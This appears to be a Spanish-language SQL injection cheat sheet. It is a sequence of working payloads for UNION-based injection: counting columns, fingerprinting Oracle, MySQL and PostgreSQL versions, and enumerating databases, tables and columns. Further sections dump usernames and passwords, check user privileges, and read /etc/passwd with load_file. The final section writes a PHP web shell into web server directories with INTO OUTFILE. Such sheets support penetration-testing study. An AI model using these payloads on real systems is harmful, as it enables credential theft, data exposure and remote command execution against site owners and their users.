## Número Columnas
```sql
' ORDER BY 1-- -
' ORDER BY 100-- -
' ORDER BY 1,2,3,4,5-- -
' ORDER BY 1,2,3,4,5#

' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT "Test",2,NULL#
' UNION SELECT @@version,NULL,NULL#
```
### ORACLE
```sql
' UNION SELECT 'NULL','NULL' FROM+dual-- -
```
## Versiones
### ORACLE
```sql
' UNION SELECT BANNER, NULL FROM v$version--
' SELECT version FROM v$instance--
```
### MySQL and Microsoft
```sql
' UNION SELECT @@version, NULL-- -
```
### PostgreSQL
```sql
' UNION SELECT version(), NULL-- -
```
## Nombre de la BD actual
```sql
' UNION SELECT NULL,database(),NULL-- -
' UNION SELECT NULL,database(),NULL#
```
## Usuario
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
' UNION SELECT NULL,user(),NULL-- -
' UNION SELECT NULL,user(),NULL#
' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
## Enumerar las DB
```sql
UNION SELECT NULL,schema_name,NULL from information_schema.schemata-- -
UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 1,1-- -
UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 2,1-- -
UNION SELECT NULL,schema_name,NULL from information_schema.schemata#
UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 1,1#
```
## Enumerar las Tablas
```sql
UNION SELECT NULL,table_name,NULL from information_schema.tables where table_schema="Colegio"-- -
UNION SELECT NULL,table_name,NULL from information_schema.tables where table_schema="Colegio"#
```
## Enumerar las Columnas
```sql
UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users"-- -
UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users" limit 1,1-- -
UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users"#
UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users" limit 2,1#
```
## Data
```sql
UNION SELECT NULL,username,NULL from users-- -
UNION SELECT NULL,password,NULL from users#
UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users-- -
UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users#
UNION SELECT 1,concat(User,0x3a,Password),3,4 from mysql.user-- -
```
## Privilegios de usuario
```sql
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
SELECT sql_grants FROM information_schema.sql_show_grants
' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges-- -
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
## Leyendo Archivos
```sql
UNION SELECT NULL,load_file('/etc/passwd'),NULL-- -
UNION SELECT NULL,load_file('/etc/passwd'),NULL#
```
## Escribiendo Archivos
```sql
' union select ("<?php system($_GET['cmd']) ?>") into outfile "C:/xampp/htdocs/shell.php"-- -
' union select 1,("<?php system($_GET['cmd']) ?>"),3,4 into outfile "/var/www/html/SQL/shell.php"-- -
```
